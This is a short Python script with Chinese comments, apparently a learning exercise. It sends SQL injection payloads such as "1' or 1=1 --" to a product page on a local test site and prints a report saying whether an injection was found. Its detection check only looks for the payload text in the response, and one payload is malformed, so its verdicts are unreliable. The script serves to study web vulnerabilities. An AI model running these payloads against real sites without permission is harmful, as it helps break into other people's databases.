import requests
# 目标地址，就是你刚才运行的网站
url = "http://127.0.0.1:5000/product"

"""
# 1:正常的请求
normal_params = {"id": "1"}
normal_response = requests.get(url, params=normal_params)

# 2:注入的请求
payload = "1' or 1=1 --"
evil_param = {"id": payload}
evil_response = requests.get(url, params=evil_param)

# 打印看看结果
print("正常响应长度：", len(normal_response.text))
print("注入响应长度：", len(evil_response.text))
"""
# 判断是否存在注入
# 正确判断：看注入后的SQL语句是否包含我们的payload

#创建一个payload列表，就是存放我们需要测试的payload
payload_list = [
    "1' or 1=1 --",
    "1' and 1=2 --",
    "1' or '1'='1",
    "1' sleep(5) --",
]

# 是否存在漏洞
is_vulnerable = False
# 记录命中的payload
hit_payloads = []

for payload in payload_list:
#发送请求
    res = requests.get(url, params={"id": payload})

#判断：页面里出现了注入特征
    if "or 1=1 " in res.text or "and 1=2" in res.text:
        is_vulnerable = True
        hit_payloads.append(payload)
        # break  # 找到一个就停
print("====== SQL注入扫描报告 ======")
print(f"目标地址：{url}")
print(f"测试Payload数量：{len(payload_list)} 个")
print(f"命中Payload：")
for p in hit_payloads:
    print(f"\t- {p}")

if is_vulnerable:
    print("结果：🚨 高危！存在SQL注入漏洞！")
else:
    print("结果：✅ 安全！未发现漏洞！")
